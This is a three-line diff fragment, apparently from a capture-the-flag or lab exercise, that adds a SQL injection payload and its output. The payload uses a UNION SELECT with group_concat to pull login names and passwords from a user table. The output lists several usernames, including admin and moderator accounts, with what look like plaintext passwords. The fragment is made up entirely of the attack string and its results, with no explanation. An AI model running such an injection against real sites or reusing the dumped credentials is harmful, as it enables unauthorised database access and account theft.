@@ -1,0 +1,3 @@
+blabla' union select 1,group_concat(login,'**',the_password_column_nobody_is_going_to_guess),3,4 from user-- -
+
+admin**saturdayisthebestdayoftheweek,lisa**ilovedogs,niels**rosesarered,moderator**ilovemoderatingexceptonweekends,ekster123**1234 (3, 4)
